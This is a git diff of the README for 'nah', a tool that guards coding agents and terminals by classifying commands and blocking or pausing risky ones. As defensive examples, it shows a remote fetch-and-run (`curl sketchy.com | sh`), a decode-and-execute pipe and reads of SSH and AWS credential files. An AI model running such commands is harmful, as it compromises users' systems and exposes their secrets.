@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-  <strong>Context aware safety guard for Claude Code.</strong><br>
+  <strong>Context aware safety guard for agents and terminals.</strong><br>
   Because allow and deny isn't enough.
 </p>
 
@@ -21,23 +21,24 @@
 
 ## The problem
 
-Claude Code’s permission system is allow-or-deny per tool, but that doesn’t really scale. Deleting some files is fine sometimes. And git checkout is sometimes catastrophic. Even when you curate permissions, 200 IQ Opus can find a way around it. Maintaining a deny list is a fool’s errand.
+Developers do not want security tools that slow them down. They want boring safe actions to pass automatically, ambiguous actions to ask, and obviously dangerous actions to be blocked before damage is done. This is the promise with nah.
 
-We needed something like --dangerously-skip-permissions that doesn’t nuke your untracked files, exfiltrate your keys, or install malware.
+Agent and terminal permissions are often too blunt. Deleting some files is fine sometimes. `git checkout` is sometimes catastrophic. Maintaining a deny list is a fool's errand.
 
-`nah` classifies every guarded tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
+`nah` classifies every guarded action by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
 `git push` — Sure.<br>
-`git push --force` — **nah?**
+`git push --force` — **nah paused:** this can rewrite Git history.
 
 `rm -rf __pycache__` — Ok, cleaning up.<br>
-`rm ~/.bashrc` — **nah.**
+`rm ~/.bashrc` — **nah paused:** this targets a shell startup file.
 
 **Read** `./src/app.py` — Go ahead.<br>
-**Read** `~/.ssh/id_rsa` — **nah.**
+**Read** `~/.aws/credentials` — **nah paused:** this targets a protected file or folder.
 
-**Write** `./config.yaml` — Fine.<br>
-**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**
+**Write** `./config.py` with private key material — **nah paused:** this includes content that looks like a secret.
+
+`base64 -d payload | bash` — **nah blocked:** this decodes hidden content and runs it.
 
 ## Install
 
@@ -46,6 +47,7 @@ Choose the path that matches what you want to protect:
 | Goal | Install |
 | --- | --- |
 | Claude Code protection only | Claude Code plugin |
+| Local interactive Codex sessions | PyPI CLI + `nah run codex` |
 | Terminal guard | PyPI CLI + `nah install bash` or `nah install zsh` |
 | CLI commands, direct hooks, or key management | PyPI CLI |
 
@@ -141,7 +143,13 @@ cd nah
 
 ## What it guards
 
-nah is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts guarded tool calls before they execute:
+nah protects three surfaces today:
+
+- Claude Code through [PreToolUse hooks](https://docs.anthropic.com/en/docs/claude-code/hooks)
+- local interactive Codex through native `PermissionRequest` hooks
+- opt-in interactive bash/zsh shells through the terminal guard
+
+For agent tool calls, nah checks:
 
 | Tool | What nah checks |
 |------|----------------|
@@ -160,23 +168,23 @@ single-line commands before your interactive shell runs them.
 
 ## How it works
 
-Every guarded tool call hits a deterministic structural classifier first, no LLMs involved.
+Every guarded action hits a deterministic structural classifier first, no LLMs involved.
 
 ```
-Claude: Edit → ~/.claude/hooks/nah_guard.py
-  nah. Edit targets hook directory: ~/.claude/hooks/ (self-modification blocked)
+Agent: Bash → git push --force
+  nah paused: this can rewrite Git history.
 
-Claude: Read → ~/.aws/credentials
-  nah? Read targets sensitive path: ~/.aws (requires confirmation)
+Agent: Bash → base64 -d payload | bash
+  nah blocked: this decodes hidden content and runs it.
 
-Claude: Bash → npm test
+Agent: Bash → npm test
   ✓ allowed (package_run)
 
-Claude: Write → config.py containing "-----BEGIN PRIVATE KEY-----"
-  nah? Write content inspection [secret]: private key
+Agent: Write → config.py containing "-----BEGIN PRIVATE KEY-----"
+  nah paused: this writes private key material.
 ```
 
-**`nah.`** = blocked. **`nah?`** = asks for your confirmation. Everything else goes through.
+**`nah blocked:`** = refused before execution. **`nah paused:`** = asks for confirmation. Everything else goes through.
 
 ### Context-aware
 
@@ -194,7 +202,7 @@ The same command gets different decisions based on context:
 For decisions that need judgment, nah can optionally consult an LLM:
 
 ```
-Tool call → nah (deterministic) → LLM (optional) → Claude Code permissions → execute
+Guarded action → nah (deterministic) → LLM (optional) → agent/terminal approval flow → execute
 ```
 
 The deterministic layer always runs first. The LLM can refine eligible `ask` decisions, and it can review write-like edits for safety and intent. For Write/Edit/MultiEdit/NotebookEdit, it can relax a project-boundary ask when the edit is safe and clearly intended, or escalate a risky deterministic allow to ask. It cannot relax deterministic blocks. If no LLM is configured or available, the deterministic decision stands.
@@ -321,6 +329,9 @@ Project `.nah.yaml` can **add** classifications and **tighten** policies, but ca
 
 ```bash
 nah install claude         # install direct Claude Code hooks
+nah run codex              # launch one protected local Codex session
+nah codex doctor           # inspect Codex approval-memory/MCP preflight state
+nah codex repair           # back up and repair supported Codex preflight issues
 nah install bash           # install interactive bash guard
 nah install zsh            # install interactive zsh guard
 nah key status             # show built-in LLM key sources
@@ -348,6 +359,7 @@ nah types                        # list all action types with default policies
 nah log                          # show recent hook decisions
 nah log --blocks                 # show only blocked decisions
 nah log --asks                   # show only ask decisions
+nah log --llm                    # show decisions with LLM metadata
 nah log --tool Bash -n 20        # filter by tool, limit entries
 nah log --json                   # machine-readable output
 /nah-demo                        # live security demo inside Claude Code
